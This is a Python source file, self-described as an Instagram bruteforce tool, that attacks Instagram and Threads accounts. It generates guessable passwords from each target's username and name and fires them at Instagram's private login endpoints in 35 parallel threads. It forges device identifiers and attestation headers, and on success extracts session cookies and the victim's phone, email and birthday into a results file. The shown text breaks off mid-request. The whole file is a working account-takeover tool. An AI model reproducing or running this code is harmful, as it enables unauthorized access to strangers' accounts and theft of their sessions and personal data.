
#!/usr/bin/env python3.13

"""
Software instagram bruteforce
Copyright (c) 2023-2025 ELite3 developers (https://github.com/khamdihi-dev)
"""

import sys, httpx, time, re, base64, json, random, uuid, os, hashlib
import questionary

from lang import language
from zhfna import utils, client
from prompt_toolkit.styles import Style
from concurrent.futures import ThreadPoolExecutor

from rich.tree import Tree
from rich import print as RichPrint
from datetime import datetime

P  = "\033[97m"
D  = "\033[91m"
H  = "\033[92m"
K  = "\033[37m"
R  = "\033[91m"
RS = "\033[0m"
M  = "\033[31m"
PK = "\033[38;5;205m"
BJ = "\033[1m\033[38;5;208m"
pink = "#ff69b4"

custom_style = Style.from_dict({
    "qmark": "fg:#ffffff bold",
    "question": "fg:#ffffff bold",
    "answer": "fg:#ff69b4 bold underline",
    "pointer": "fg:#ff69b4 bold bg:#1a1a1a",
    "highlighted": "fg:#ffffff bold bg:#ff69b4",
    "separator": "fg:#ffffff",
    "instruction": "fg:#aaaaaa italic",
})

done  = 0
check = 0
colok = 0
whatismybrowser = []

def AppUseragent():
    for useragent in open('agent.txt','r').read().splitlines():
        whatismybrowser.append(useragent)

class InstaHack:
    def __init__(self, languages:list, data_users:list) -> None:
        self._dihi_ = languages[0] if languages else 'id'
        self._zhfa_ = data_users
        self._ayam_ = language.languages(self._dihi_)
        self._gaya_ = {'choices':[],'qmark': '','pointer': ' >'}
        self._dead_ = '*'
        self.postbackStatus = False
        self.qe_config = {}
        self.session_request = httpx.Client(http2=False,timeout=60)

    def ClearChoices(self):
        self._gaya_['choices'] = []

    def methodList(self) -> None:
        utils.clear()
        self.select_app_login()

    # Select apk for sign
    def select_app_login(self) -> None:
        self._gaya_['choices'].clear()
        self.app = self._ayam_.app_login()
        self._gaya_['choices'].extend(self.app['app'])
        self.app_user = questionary.select(f'{self._dead_} Login', **self._gaya_,style=custom_style,instruction='').ask()

        self.ClearChoices()
        self.apps = None
        if 'thread' in self.app_user:
            self._gaya_['choices'].extend(['manual','validate','smartlock'])
            self.apps = 'thread'
        else:
            self._gaya_['choices'].extend(['manual','smartlock'])
            self.apps = 'instagram'
        self.api = questionary.select(f'{self._dead_} Api',**self._gaya_,style=custom_style).ask()
        self.Bruteforce(self.api, self.apps)
    
    def BuatSandiOtomatis(self, username: str, nama: str):
        array_pwd = []
        pasaran_angka = ['123','1234','12345','01','02','03']
        if len(nama) >=6:
            array_pwd.append(nama.lower())
        
        for name in nama.split(' '):
            if len(name) >=3:
                if len(name) >=6:
                    array_pwd.append(name.lower())
                for angka in pasaran_angka:
                    if len(angka) == 2 and len(name) <=3:
                        continue
                    array_pwd.append(name.lower()+str(angka))
        
        if len(username) >=6:
            array_pwd.append(username.replace('_',' ').replace('.',' '))
            array_pwd.append(username)

        username_ = username.replace('.',' ').replace('_',' ').split(' ')
        for _user in username_:
            if len(_user) >=3:
                for angka in pasaran_angka:
                    if len(_user) <=3 and len(angka) == 2:
                        continue
                    array_pwd.append(_user+str(angka))

        return list(set(array_pwd))
        
    def Bruteforce(self, api_, aplication) -> None:
        AppUseragent()
        print(f'\n {self._dead_} Pastikan kamu sudah setting api telegram di menu..')
        self.post_ = input(f' {self._dead_} Aktifkan postback y/t: ').lower()
        if self.post_ == 'y':self.postbackStatus = True
        else:self.postbackStatus = False
        print('\n')

        with ThreadPoolExecutor(max_workers=35) as executor:
            for data in self._zhfa_:
                try:
                    ds_user_id,username,full_name = data.split('<=>')
                    password_ = self.BuatSandiOtomatis(username,full_name)
                    
                    if aplication == 'thread':
                        if api_ == 'validate':
                            executor.submit(self.THD_validate,ds_user_id,username,password_)
                        elif api_ == 'smartlock':
                            executor.submit(self.THD_smartlock,ds_user_id,username,password_)
                        else:
                            executor.submit(self.THD_manual,ds_user_id,username,password_)
                    elif aplication == 'instagram':
                        if api_ == 'manual':
                            executor.submit(self.ING_manual,ds_user_id,username,password_)
                        else:
                            executor.submit(self.ING_smartlock,ds_user_id,username,password_)

                except:pass
        
        print(f'\n\n {self._dead_} Done bff {colok} akun\n {self._dead_} success: {done}\n {self._dead_} checkpoint: {check}')
        sys.exit()
    
    def ING_connection(self) -> dict:
        return random.choice([
            {
                'x-fb-connection-type': 'MOBILE.LTE',
                'x-ig-connection-type': 'MOBILE(LTE)',
            },
            {
                'x-fb-connection-type': 'WIFI',
                'x-ig-connection-type': 'WIFI'
            }
        ])
    
    def AppUac(self) -> str:
        if len(whatismybrowser) > 0:
            return str(random.choice(whatismybrowser))
        return 'Instagram 384.0.0.46.83 Android (35/15; 340dpi; 1080x2400; motorola; moto g54 5G; cancunf; mt6855; pt_BR; 746325133)'

    def generate_nav_chain(self, screen="com.bloks.www.caa.login.home_template", iteration=1, action="button"):
        epoch = time.time()
        timestamp = f"{int(epoch)}.{random.randint(100, 999)}"
        return f"{screen}:{screen}:{iteration}:{action}:{timestamp}::"
    
    def create_android_id(self, seed:str) -> str:
        hashing = hashlib.md5()
        hashing.update(seed.encode('utf-8'))
        dev = uuid.UUID(hashing.hexdigest())
        return 'android-{}'.format(dev.hex[:16])

    def encrypt_password(self, password):
        return f'#PWD_INSTAGRAM:0:{int(time.time())}:{password}'

    
    # THREADS APP API || 2025
    def THD_smartlock(self, uid, users, passlist) -> None:
        global done, check, colok
        ZaraMid = 'aF6arwABAAGiEo9BdLr1sSNq0bvA'
        if os.path.isfile('data/config.json'):
            config = json.loads(open('data/config.json','r').read())
            ZaraMid = config['mechanize']

        print(f' {self._dead_} app thread {colok} sukses:{done} check:{check} `smartlock`',end='\r',flush=True)
        for pwd in passlist:
            try:
                ig_device_id = str(uuid.uuid4())
                ig_android_id = self.create_android_id(ig_device_id)
                ig_family_device_id = str(uuid.uuid4())
                ig_timezone = str(-time.timezone)
                ig_pigeon_rawtime =  str(time.time())[:14]
                ig_pigeon_session_id = str(uuid.uuid4())
                encp = f'#PWD_INSTAGRAM:0:{int(time.time())}:{pwd}'

                self.session_request.headers.update({
                    **self.ING_connection(),
                    "x-ig-app-locale": "in_ID",
                    "x-ig-device-locale": "in_ID",
                    "x-ig-mapped-locale": "id_ID",
                    "x-pigeon-session-id": f"UFS-{ig_pigeon_session_id}-0",
                    "x-pigeon-rawclienttime": str(ig_pigeon_rawtime),
                    "x-ig-bandwidth-speed-kbps": str(round(random.uniform(5000.0, 15000.0), 3)),  # 5 Mbps – 15 Mbps
                    "x-ig-bandwidth-totalbytes-b": str(random.randint(100000, 5000000)),           # 100 KB – 5 MB
                    "x-ig-bandwidth-totaltime-ms": str(random.randint(100, 3000)),                  # 0.1 – 3 detik
                    "x-bloks-version-id": "baceff4fb0aafd8e2294b8ff84f97bde1b5be181db223c249be072598ea82e7e",
                    "x-ig-www-claim": "0",
                    "x-bloks-prism-button-version": "CONTROL",
                    "x-bloks-prism-colors-enabled": "false",
                    "x-bloks-prism-font-enabled": "false",
                    "x-bloks-is-layout-rtl": "false",
                    "x-ig-device-id": str(ig_device_id),
                    "x-ig-family-device-id": str(ig_family_device_id),
                    "x-ig-android-id": str(ig_android_id),
                    "x-ig-timezone-offset": str(ig_timezone),
                    "x-ig-nav-chain": str(self.generate_nav_chain()),
                    "x-ig-capabilities": "3brTv10=",
                    "x-ig-app-id": "3419628305025917",
                    "priority": "u=3",
                    "user-agent": str(self.AppUac().replace('Instagram','Barcelona')),
                    "accept-language": "id-ID, en-US",
                    "x-mid": ZaraMid,
                    "ig-intended-user-id": "0",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "x-fb-http-engine": "Liger",
                    "x-fb-client-ip": "True",
                    "x-fb-server-cluster": "True"
                })
                data = {
                    'params': json.dumps({"client_input_params":{"block_store_machine_id":"","device_id":ig_android_id,"lois_settings":{"lois_token":""},"cloud_trust_token":None,"name":users,"machine_id":ZaraMid,"profile_pic_url":None,"contact_point":users,"encrypted_password":encp},"server_params":{"is_from_logged_out":0,"layered_homepage_experiment_group":None,"INTERNAL__latency_qpl_marker_id":36707139,"family_device_id":ig_family_device_id,"device_id":None,"offline_experiment_group":None,"waterfall_id":None,"access_flow_version":"pre_mt_behavior","INTERNAL__latency_qpl_instance_id":1.83365062400592E14,"login_source":"Login","is_from_logged_in_switcher":0,"is_platform_login":0}}),
                    'bk_client_context': json.dumps({"bloks_version":"baceff4fb0aafd8e2294b8ff84f97bde1b5be181db223c249be072598ea82e7e","styles_id":"instagram"}),
                    'bloks_versioning_id':'baceff4fb0aafd8e2294b8ff84f97bde1b5be181db223c249be072598ea82e7e'
                }
                resp = self.session_request.post(
                    'https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request/',
                    data=data,
                )
                if 'logged_in_user' in resp.text.replace('\\',''):
                    done +=1
                    try:
                        ig_bearer_token = json.loads(base64.b64decode(re.search('"Bearer IGT:2:(.*?)"',resp.text.replace('\\','')).group(1)))
                        ig_cookie_users = ';'.join(['%s=%s'%(name,value) for name,value in ig_bearer_token.items()])
                    except AttributeError:
                        ig_bearer_token = ''
                        ig_cookie_users = ''
                    kuki = f'{client.generate_instagram_cookie()}{ig_cookie_users};'
                    info = client.account(kuki)
                    ig_first_name, ig_phone_number, ig_user_birthday, ig_user_bio, ig_followes_user, ig_following_user, ig_email_user, ig_feed_post = info.ProfileInfo(uid=uid,username=users)
                    rest =  f'{users}|{pwd}|{ig_followes_user}|{ig_following_user}|{ig_feed_post}|{kuki}'
                    self.simpan_hasil(rest, True)
                    self.EliteStyle('api smartlock',rest,True)
                    break

                elif 'redirection_to_checkpoint' in resp.text.replace('\\',''):
                    check +=1
                    ig_followers_user, ig_following_user, ig_feed_post = client.account(None).friends_user_chek(users)
                    rest = f'{users}|{pwd}|{ig_followers_user}|{ig_following_user}|{ig_feed_post}'
                    self.EliteStyle('api smartlock',rest,False)
                    self.simpan_hasil(rest, False)
                    break
                elif '<h1>5xx Server Error</h1>' in resp.text:
                    print(f' {self._dead_} Server Error!! modpes',end='\r', flush=True)
                    continue

            except (httpx.NetworkError,httpx.ConnectError,httpx.Timeout):
                time.sleep(20)

        colok +=1
    
    def THD_validate(self, uid, users, passlist) -> None:
        global done, check, colok
        ZaraMid = 'aF6arwABAAGiEo9BdLr1sSNq0bvA'
        if os.path.isfile('data/config.json'):
            config = json.loads(open('data/config.json','r').read())
            ZaraMid = config['mechanize']

        print(f' {self._dead_} app thread {colok} sukses:{done} check:{check} `validate`',end='\r',flush=True)
        for pwd in passlist:
            try:
                encp = f'#PWD_INSTAGRAM:0:{int(time.time())}:{pwd}'
                zara_ig_device_id = str(uuid.uuid4())
                zara_ig_android_id = self.create_android_id(zara_ig_device_id)
                zara_ig_family_device_id = str(uuid.uuid4())
                data = {'params':json.dumps({"client_input_params":{"has_granted_read_phone_permissions":0,"app_manager_id":"","device_id":zara_ig_android_id,"sim_phones":[],"login_attempt_count":1,"secure_family_device_id":"","machine_id":ZaraMid,"has_granted_read_contacts_permissions":0,"accounts_list":[{"token":"","account_type":"google_oauth","credential_type":"google_oauth"}],"auth_secure_device_id":"","has_whatsapp_installed":0,"password":encp,"family_device_id":zara_ig_family_device_id,"block_store_machine_id":"","device_emails":[f"{users}@gmail.com"],"try_num":1,"lois_settings":{"lois_token":""},"cloud_trust_token":None,"event_flow":"aymh","password_contains_non_ascii":"false","event_step":"pw_input","headers_infra_flow_id":"","contact_point":users,"encrypted_msisdn":""},"server_params":{"should_trigger_override_login_2fa_action":0,"is_vanilla_password_page_empty_password":0,"is_from_logged_out":0,"should_trigger_override_login_success_action":0,"login_credential_type":"none","server_login_source":"device_based_login","waterfall_id":str(uuid.uuid4()),"two_step_login_type":"one_step_login","login_source":"AccountsYouMayHave","is_platform_login":0,"INTERNAL__latency_qpl_marker_id":36707139,"is_from_aymh":0,"offline_experiment_group":None,"is_from_landing_page":0,"password_text_input_id":"uc6n4h:60","is_from_empty_password":0,"is_from_msplit_fallback":0,"ar_event_source":"login_home_page","layered_homepage_experiment_group":None,"should_show_nested_nta_from_aymh":1,"device_id":zara_ig_android_id,"INTERNAL__latency_qpl_instance_id":1.83445057700153E14,"is_caa_perf_enabled":0,"credential_type":"password","is_from_password_entry_page":1,"caller":"gslr","family_device_id":zara_ig_family_device_id,"is_from_assistive_id":0,"access_flow_version":"F2_FLOW","is_from_logged_in_switcher":0}}),'bk_client_context':json.dumps({"bloks_version":"baceff4fb0aafd8e2294b8ff84f97bde1b5be181db223c249be072598ea82e7e","styles_id":"instagram"}),'bloks_versioning_id':"baceff4fb0aafd8e2294b8ff84f97bde1b5be181db223c249be072598ea82e7e",}
                self.session_request.headers.update({
                    **self.ING_connection(),
                    'x-ig-app-locale': 'in_ID',
                    'x-ig-device-locale': 'in_ID',
                    'x-ig-mapped-locale': 'id_ID',
                    'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-1',
                    'x-pigeon-rawclienttime': str(time.time())[:14],
                    'x-ig-bandwidth-speed-kbps': '-1.000',
                    'x-ig-bandwidth-totalbytes-b': '0',
                    'x-ig-bandwidth-totaltime-ms': '0',
                    'x-bloks-version-id': 'baceff4fb0aafd8e2294b8ff84f97bde1b5be181db223c249be072598ea82e7e',
                    'x-ig-www-claim': '0',
                    'x-bloks-prism-button-version': 'CONTROL',
                    'x-bloks-prism-colors-enabled': 'false',
                    'x-bloks-prism-font-enabled': 'false',
                    'x-ig-attest-params': '{"attestation":[{"version":2,"type":"keystore","errors":[-1013],"challenge_nonce":"","signed_nonce":"","key_hash":""}]}',
                    'x-bloks-is-layout-rtl': 'false',
                    'x-ig-device-id': zara_ig_device_id,
                    'x-ig-family-device-id': zara_ig_family_device_id,
                    'x-ig-android-id': zara_ig_android_id,
                    'x-ig-timezone-offset': str(-time.timezone),
                    'x-ig-nav-chain': f'com.bloks.www.caa.login.home_template:com.bloks.www.caa.login.home_template:1:button:{int(time.time())}.228::,IgCdsScreenNavigationLoggerModule:com.bloks.www.caa.login.aymh_password_entry:2:button:{int(time.time())}.380::',
                    'x-ig-capabilities': '3brTv10=',
                    'x-ig-app-id': '3419628305025917',
                    'priority': 'u=3',
                    'user-agent': str(self.AppUac().replace('Instagram','Barcelona')),
                    'accept-language': 'id-ID, en-US',
                    'x-mid': ZaraMid,
                    'ig-intended-user-id': '0',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'accept-encoding': 'gzip, deflate',
                    'x-fb-http-engine': 'Liger',
                    'x-fb-client-ip': 'True',
                    'x-fb-server-cluster': 'True'
                })
                resp = self.session_request.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/',data=data)
                if 'logged_in_user' in resp.text.replace('\\',''):
                    done +=1
                    try:
                        ig_bearer_token = json.loads(base64.b64decode(re.search('"Bearer IGT:2:(.*?)"',resp.text.replace('\\','')).group(1)))
                        ig_cookie_users = ';'.join(['%s=%s'%(name,value) for name,value in ig_bearer_token.items()])
                    except AttributeError:
                        ig_bearer_token = ''
                        ig_cookie_users = ''
                    kuki = f'{client.generate_instagram_cookie()}{ig_cookie_users};'
                    info = client.account(kuki)
                    ig_first_name, ig_phone_number, ig_user_birthday, ig_user_bio, ig_followes_user, ig_following_user, ig_email_user, ig_feed_post = info.ProfileInfo(uid=uid,username=users)
                    rest =  f'{users}|{pwd}|{ig_followes_user}|{ig_following_user}|{ig_feed_post}|{kuki}'
                    self.simpan_hasil(rest, True)
                    self.EliteStyle('api validate',rest,True)
                    break
                elif 'redirection_to_checkpoint' in resp.text.replace('\\',''):
                    check +=1
                    ig_followers_user, ig_following_user, ig_feed_post = client.account(None).friends_user_chek(users)
                    rest = f'{users}|{pwd}|{ig_followers_user}|{ig_following_user}|{ig_feed_post}'
                    self.EliteStyle('api validate',rest,False)
                    self.simpan_hasil(rest, False)
                    break
                elif '<h1>5xx Server Error</h1>' in resp.text:
                    print(f' {self._dead_} Server Error!! modpes',end='\r', flush=True)
                    continue
                
            except (httpx.NetworkError,httpx.ConnectError,httpx.Timeout):
                time.sleep(20)

        colok+=1


    def THD_manual(self, uid, users, passlist) -> None:
        global done, check, colok
        # session = httpx.Client(http2=True,timeout=60)

        ZaraMid = 'aGS3aQAAAAH_k2BfVSOfbkp91_iT'
        if os.path.isfile('data/config.json'):
            config = json.loads(open('data/config.json','r').read())
            ZaraMid = config['mechanize']

        print(f' {self._dead_} app thread {colok} sukses:{done} check:{check} `manual`',end='\r',flush=True)
        for pwd in passlist:
            try:
                encp = f'#PWD_INSTAGRAM:0:{int(time.time())}:{pwd}'
                zara_ig_device_id = str(uuid.uuid4())
                zara_ig_android_id = self.create_android_id(zara_ig_device_id)
                zara_ig_family_device_id = str(uuid.uuid4())
                self.session_request.headers.update({
                    **self.ING_connection(),
                    "x-ig-app-locale": "in_ID",
                    "x-ig-device-locale": "in_ID",
                    "x-ig-mapped-locale": "id_ID",
                    "x-pigeon-session-id": f'UFS-{str(uuid.uuid4())}-1',
                    "x-pigeon-rawclienttime": str(time.time())[:14],
                    "x-ig-bandwidth-speed-kbps": f"{random.randint(100,999)}.000",
                    "x-ig-bandwidth-totalbytes-b": "0",
                    "x-ig-bandwidth-totaltime-ms": "0",
                    "x-bloks-version-id": "baceff4fb0aafd8e2294b8ff84f97bde1b5be181db223c249be072598ea82e7e",
                    "x-ig-www-claim": "0",
                    "x-bloks-prism-button-version": "CONTROL",
                    "x-bloks-prism-colors-enabled": "false",
                    "x-bloks-prism-font-enabled": "false",
                    "x-ig-attest-params": '{"attestation":[{"version":2,"type":"keystore","errors":[-1013],"challenge_nonce":"","signed_nonce":"","key_hash":""}]}',
                    "x-bloks-is-layout-rtl": "false",
                    "x-ig-device-id": zara_ig_device_id,
                    "x-ig-family-device-id": zara_ig_family_device_id,
                    "x-ig-android-id": zara_ig_android_id,
                    "x-ig-timezone-offset": str(-time.timezone),
                    "x-ig-nav-chain": f"com.bloks.www.caa.login.home_template:com.bloks.www.caa.login.home_template:1:button:{int(time.time())}.228::,IgCdsScreenNavigationLoggerModule:com.bloks.www.caa.login.aymh_password_entry:2:button:{int(time.time())}.380::,IgCdsScreenNavigationLoggerModule:com.bloks.www.caa.login.home_template:3:button:{int(time.time())}.50::",
                    "x-ig-capabilities": "3brTv10=",
                    "x-ig-app-id": "3419628305025917",
                    "priority": "u=3",
                    "user-agent": str(self.AppUac().replace('Instagram','Barcelona')),
                    "accept-language": "id-ID, en-US",
                    "x-mid": ZaraMid,
                    "ig-intended-user-id": "0",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "accept-encoding": "gzip, deflate",
                    "x-fb-http-engine": "Liger",
                    "x-fb-client-ip": "True",
                    "x-fb-server-cluster": "True"
                })
                data = {
                    'params': json.dumps({"client_input_params":{"sim_phones":[],"aymh_accounts":[{"profiles":{"id":{"is_derived":0,"credentials":[],"account_center_id":"","profile_picture_url":"","small_profile_picture_url":None,"notification_count":0,"token":"","last_access_time":0,"has_smartlock":0,"credential_type":"none","password":"","from_accurate_privacy_result":0,"dbln_validated":0,"user_id":"","name":"","nta_eligibility_reason":None,"username":"","account_source":""}},"id":""}],"secure_family_device_id":"","has_granted_read_contacts_permissions":0,"auth_secure_device_id":"","has_whatsapp_installed":0,"password":encp,"sso_token_map_json_string":"","block_store_machine_id":"","cloud_trust_token":None,"event_flow":"login_manual","password_contains_non_ascii":"false","client_known_key_hash":"","encrypted_msisdn":"","has_granted_read_phone_permissions":0,"app_manager_id":"","device_id":zara_ig_android_id,"login_attempt_count":1,"machine_id":ZaraMid,"accounts_list":[],"family_device_id":zara_ig_family_device_id,"fb_ig_device_id":[],"device_emails":[f"{users}@gmail.com"],"try_num":1,"lois_settings":{"lois_token":""},"event_step":"home_page","headers_infra_flow_id":"","openid_tokens":{},"contact_point":users},"server_params":{"should_trigger_override_login_2fa_action":0,"is_vanilla_password_page_empty_password":0,"is_from_logged_out":0,"should_trigger_override_login_success_action":0,"login_credential_type":"none","server_login_source":"login","waterfall_id":None,"two_step_login_type":"one_step_login","login_source":"Login","is_platform_login":0,"INTERNAL__latency_qpl_marker_id":36707139,"is_from_aymh":0,"offline_experiment_group":None,"is_from_landing_page":0,"password_text_input_id":"ubphvk:70","is_from_empty_password":0,"is_from_msplit_fallback":0,"ar_event_source":"login_home_page","username_text_input_id":"ubphvk:69","layered_homepage_experiment_group":None,"should_show_nested_nta_from_aymh":1,"device_id":None,"INTERNAL__latency_qpl_instance_id":1.83365062400178E14,"reg_flow_source":"login_home_native_integration_point","is_caa_perf_enabled":1,"credential_type":"password","is_from_password_entry_page":0,"caller":"gslr","family_device_id":zara_ig_family_device_id,"is_from_assistive_id":0,"access_flow_version":"pre_mt_behavior","is_from_logged_in_switcher":0}}),
                    'bk_client_context': json.dumps({"bloks_version":"baceff4fb0aafd8e2294b8ff84f97bde1b5be181db223c249be072598ea82e7e","styles_id":"instagram"}),
                    'bloks_versioning_id': 'baceff4fb0aafd8e2294b8ff84f97bde1b5be181db223c249be072598ea82e7e'
                }
                resp = self.session_request.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/',data=data)
                if 'logged_in_user' in resp.text.replace('\\',''):
                    done +=1
                    try:
                        ig_bearer_token = json.loads(base64.b64decode(re.search('"Bearer IGT:2:(.*?)"',resp.text.replace('\\','')).group(1)))
                        ig_cookie_users = ';'.join(['%s=%s'%(name,value) for name,value in ig_bearer_token.items()])
                    except AttributeError:
                        ig_bearer_token = ''
                        ig_cookie_users = ''
                    kuki = f'{client.generate_instagram_cookie()}{ig_cookie_users};'
                    info = client.account(kuki)
                    ig_first_name, ig_phone_number, ig_user_birthday, ig_user_bio, ig_followes_user, ig_following_user, ig_email_user, ig_feed_post = info.ProfileInfo(uid=uid,username=users)
                    rest = f'{users}|{pwd}|{ig_followes_user}|{ig_following_user}|{ig_feed_post}|{kuki}'
                    self.simpan_hasil(rest, True)
                    self.EliteStyle('api manual',rest,True)
                    break
                elif 'redirection_to_checkpoint' in resp.text.replace('\\',''):
                    check +=1
                    ig_followers_user, ig_following_user, ig_feed_post = client.account(None).friends_user_chek(users)
                    rest = f'{users}|{pwd}|{ig_followers_user}|{ig_following_user}|{ig_feed_post}'
                    self.EliteStyle('api manual',rest,False)
                    self.simpan_hasil(rest, False)
                    break
                elif '<h1>5xx Server Error</h1>' in resp.text:
                    print(f' {self._dead_} Server Error!! modpes',end='\r', flush=True)
                    continue
                
            except (httpx.NetworkError,httpx.ConnectError,httpx.Timeout):
                time.sleep(20)

        colok +=1

    # --[ END API THREADS ]--
    def ING_smartlock(self,uid,users,passlist) -> None:
        global done, check, colok
        # session = httpx.Client(http2=True,timeout=60)
        _header_ = self.instagram_default()

        ZaraMid = 'aGS3aQAAAAH_k2BfVSOfbkp91_iT'
        ZaraNonce = '9aEdPhIfQr6moTbWDOjJ42e8XNlApwZH'
        if os.path.isfile('data/config.json'):
            config = json.loads(open('data/config.json','r').read())
            ZaraMid = config['mechanize']
            ZaraNonce = config['nonce_id']

        print(f' {self._dead_} app instagram {colok} sukses:{done} check:{check} `smartlock`',end='\r',flush=True)
        for pwd in passlist:
            try:
                encp = f'#PWD_INSTAGRAM:0:{int(time.time())}:{pwd}'
                zara_ig_device_id = str(uuid.uuid4())
                zara_ig_android_id = self.create_android_id(zara_ig_device_id)
                zara_ig_family_device_id = str(uuid.uuid4())
                zara_ig_pegion_session_id = str(uuid.uuid4())
                zara_ig_pigeon_rawtime =  str(time.time())[:14]
                zara_ig_client_connection = str(uuid.uuid4().hex)
                _header_.update({
                    **self.ING_connection(),
                    "x-ig-android-id": str(zara_ig_android_id),
                    "x-ig-bandwidth-speed-kbps": "-1.000",
                    "x-ig-bandwidth-totalbytes-b": "0",
                    "x-ig-bandwidth-totaltime-ms": "0",
                    "x-ig-device-id": zara_ig_device_id,
                    "x-ig-family-device-id": zara_ig_family_device_id,
                    "x-ig-timezone-offset": str(-time.timezone),
                    "x-mid": str(ZaraMid),
                    "x-pigeon-rawclienttime": str(zara_ig_pigeon_rawtime),
                    "x-pigeon-session-id": f"UFS-{zara_ig_pegion_session_id}-0",
                    "user-agent": str(self.AppUac()),
                    "x-fb-conn-uuid-client": str(zara_ig_client_connection),
                    "x-fb-friendly-name": "IgApi: bloks/async_action/com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request/",
                    "x-ig-attest-params": json.dumps({"attestation":[{"version":2,"type":"keystore","errors":[-1013],"challenge_nonce":ZaraNonce,"signed_nonce":"","key_hash":""}]})
                })
                _header_.pop("x-ig-nav-chain","")
                data = {
                    'params': json.dumps({"server_params":{"family_device_id":zara_ig_family_device_id,"device_id":zara_ig_android_id,"machine_id":ZaraMid,"from_native_screen":True,"contact_point":users,"encrypted_password":encp}}),
                    'bk_client_context': json.dumps({"bloks_version":"928fc70e922cbb30a0ab7b9a635b66273193d11341a1c833accfe6cbaaa0dae2","styles_id":"instagram"}),
                    'bloks_versioning_id': '928fc70e922cbb30a0ab7b9a635b66273193d11341a1c833accfe6cbaaa0dae2'
                }
                resp = self.session_request.post('https://b.i.instagram.com/api/v1/bloks/async_action/com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request/',data=data,headers=_header_)
                if 'logged_in_user' in resp.text.replace('\\',''):
                    done +=1
                    try:
                        ig_bearer_token = json.loads(base64.b64decode(re.search('"Bearer IGT:2:(.*?)"',resp.text.replace('\\','')).group(1)))
                        ig_cookie_users = ';'.join(['%s=%s'%(name,value) for name,value in ig_bearer_token.items()])
                    except AttributeError:
                        ig_bearer_token = ''
                        ig_cookie_users = ''
                    kuki = f'{client.generate_instagram_cookie()}{ig_cookie_users};'
                    info = client.account(kuki)
                    ig_first_name, ig_phone_number, ig_user_birthday, ig_user_bio, ig_followes_user, ig_following_user, ig_email_user, ig_feed_post = info.ProfileInfo(uid=uid,username=users)
                    rest =  f'{users}|{pwd}|{ig_followes_user}|{ig_following_user}|{ig_feed_post}|{kuki}'
                    self.simpan_hasil(rest, True)
                    self.EliteStyle('api smartlock',rest,True)
                    break
                elif 'redirection_to_checkpoint' in resp.text.replace('\\',''):
                    check +=1
                    ig_followers_user, ig_following_user, ig_feed_post = client.account(None).friends_user_chek(users)
                    rest = f'{users}|{pwd}|{ig_followers_user}|{ig_following_user}|{ig_feed_post}'
                    self.EliteStyle('api smartlock',rest,False)
                    self.simpan_hasil(rest, False)
                    break
                elif '<h1>5xx Server Error</h1>' in resp.text:
                    print(f' {self._dead_} Server Error!! modpes',end='\r', flush=True)
                    continue
                
            except (httpx.NetworkError,httpx.ConnectError,httpx.Timeout):
                time.sleep(15)
        colok+=1

    def ING_manual(self, uid, users, passlist) -> None:
        global done, check, colok
        # session = httpx.Client(http2=True,timeout=60)
        _header_ = self.instagram_default()

        ZaraMid = 'aGS3aQAAAAH_k2BfVSOfbkp91_iT'
        ZaraNonce = '9aEdPhIfQr6moTbWDOjJ42e8XNlApwZH'
        if os.path.isfile('data/config.json'):
            config = json.loads(open('data/config.json','r').read())
            ZaraMid = config['mechanize']
            ZaraNonce = config['nonce_id']


        print(f' {self._dead_} app instagram {colok} sukses:{done} check:{check} `smartlock`',end='\r',flush=True)
        for pwd in passlist:
            try:
                encp = f'#PWD_INSTAGRAM:0:{int(time.time())}:{pwd}'
                zara_ig_device_id = str(uuid.uuid4())
                zara_ig_android_id = self.create_android_id(zara_ig_device_id)
                zara_ig_family_device_id = str(uuid.uuid4())
                zara_ig_pegion_session_id = str(uuid.uuid4())
                zara_ig_pigeon_rawtime =  str(time.time())[:14]
                zara_ig_client_connection = str(uuid.uuid4().hex)
                _header_.update({
                    **self.ING_connection(),
                    "x-ig-android-id": str(zara_ig_android_id),
                    "x-ig-bandwidth-speed-kbps": "-1.000",
                    "x-ig-bandwidth-totalbytes-b": "0",
                    "x-ig-bandwidth-totaltime-ms": "0",
                    "x-ig-device-id": zara_ig_device_id,
                    "x-ig-family-device-id": zara_ig_family_device_id,
                    "x-ig-nav-chain": f"com.bloks.www.caa.login.login_homepage:com.bloks.www.caa.login.login_homepage:1:button:{str(time.time())[:14]}::",
                    "x-ig-timezone-offset": str(-time.timezone),
                    "x-mid": str(ZaraMid),
                    "x-pigeon-rawclienttime": str(zara_ig_pigeon_rawtime),
                    "x-pigeon-session-id": f"UFS-{zara_ig_pegion_session_id}-0",
                    "user-agent": str(self.AppUac()),
                    "x-fb-conn-uuid-client": str(zara_ig_client_connection),
                    "x-ig-attest-params": json.dumps({"attestation":[{"version":2,"type":"keystore","errors":[-1013],"challenge_nonce":ZaraNonce,"signed_nonce":"","key_hash":""}]})
                })
                numb = ''.join(str(random.randint(0, 9)) for _ in range(8))
                data = {
                    'params': json.dumps({"client_input_params":{"sim_phones":[f"+62838{numb}"],"aymh_accounts":[],"secure_family_device_id":"","has_granted_read_contacts_permissions":0,"auth_secure_device_id":"","has_whatsapp_installed":0,"password":encp,"sso_token_map_json_string":"","block_store_machine_id":"","ig_vetted_device_nonces":None,"cloud_trust_token":None,"event_flow":"login_manual","password_contains_non_ascii":"false","client_known_key_hash":"","encrypted_msisdn":"","has_granted_read_phone_permissions":0,"app_manager_id":"","should_show_nested_nta_from_aymh":0,"device_id":zara_ig_android_id,"login_attempt_count":1,"machine_id":ZaraMid,"flash_call_permission_status":{"READ_PHONE_STATE":"GRANTED","READ_CALL_LOG":"GRANTED","ANSWER_PHONE_CALLS":"GRANTED"},"accounts_list":[{"credential_type":"google_oauth","account_type":"google_oauth","token":""}],"family_device_id":zara_ig_family_device_id,"fb_ig_device_id":[],"device_emails":[f"{users}@gmail.com"],"try_num":1,"lois_settings":{"lois_token":""},"event_step":"home_page","headers_infra_flow_id":"","openid_tokens":{f"{users}@gmail.com":""},"contact_point":users},"server_params":{"should_trigger_override_login_2fa_action":0,"is_vanilla_password_page_empty_password":0,"is_from_logged_out":0,"should_trigger_override_login_success_action":0,"login_credential_type":"none","server_